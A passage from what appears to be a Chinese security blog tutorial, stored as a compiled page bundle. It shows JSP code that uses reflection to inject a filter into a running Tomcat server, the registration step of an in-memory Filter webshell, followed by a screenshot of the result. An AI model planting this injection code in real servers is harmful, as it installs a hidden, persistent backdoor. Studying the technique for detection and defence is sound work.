standardContext.addFilterDef(filterDef);</span></span>\\n<span class=\\"line\\"><span>    //创建filtermap</span></span>\\n<span class=\\"line\\"><span>    FilterMap filterMap  = new FilterMap();</span></span>\\n<span class=\\"line\\"><span>    filterMap.setFilterName(name);</span></span>\\n<span class=\\"line\\"><span>    filterMap.addURLPattern(\\"/*\\");</span></span>\\n<span class=\\"line\\"><span>    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span></span>\\n<span class=\\"line\\"><span>    //直接添加在最前</span></span>\\n<span class=\\"line\\"><span>    standardContext.addFilterMapBefore(filterMap);</span></span>\\n<span class=\\"line\\"><span>    //使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</span></span>\\n<span class=\\"line\\"><span>    Field fieldconfigs = standardContext.getClass().getDeclaredField(\\"filterConfigs\\");</span></span>\\n<span class=\\"line\\"><span>    fieldconfigs.setAccessible(true);</span></span>\\n<span class=\\"line\\"><span>    Map filterConfigs = (Map) fieldconfigs.get(standardContext);</span></span>\\n<span class=\\"line\\"><span>        //获取构造函数</span></span>\\n<span class=\\"line\\"><span>    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span></span>\\n<span class=\\"line\\"><span>    constructor.setAccessible(true);</span></span>\\n<span class=\\"line\\"><span>    ApplicationFilterConfig filterconfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>    filterConfigs.put(name,filterconfig);</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div><figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628233938672.png\\" alt=\\"image-20240628233938672\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240628233938672</figcaption></figure>\\n<p>效果如图</p>\\n</li>\\n</ul>","autoDesc":true}');export{c as comp,h as data};
